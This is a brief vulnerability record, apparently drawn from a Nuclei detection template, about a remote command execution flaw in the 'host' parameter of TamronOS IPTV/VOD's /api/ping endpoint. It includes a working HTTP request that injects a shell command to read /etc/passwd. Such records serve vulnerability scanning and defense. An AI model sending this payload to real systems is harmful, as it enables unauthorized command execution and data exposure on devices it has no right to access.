# Vulnerability: TamronOS IPTV/VOD - Remote Command Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`tamronos-rce.yaml`)

## Description
TamronOS IPTV/VOD contains a remote command execution in the 'host' parameter of the /api/ping endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
```

